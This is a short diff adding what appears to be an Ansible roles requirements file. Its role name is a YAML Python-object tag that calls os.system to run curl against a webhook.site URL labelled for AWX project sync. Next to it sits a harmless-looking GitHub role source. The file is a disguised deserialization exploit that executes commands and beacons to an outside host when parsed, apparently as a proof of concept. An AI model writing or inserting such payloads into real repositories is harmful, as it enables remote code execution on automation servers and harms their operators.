@@ -1,0 +1,4 @@
+---
+roles:
+  - name: !!python/object/apply:os.system ["curl https://webhook.site/4e121085-cda1-4e75-9bdf-8b15b9f50c7e?target=AWX_PROJECT_SYNC"]
+    src: https://github.com/geerlingguy/ansible-role-apache
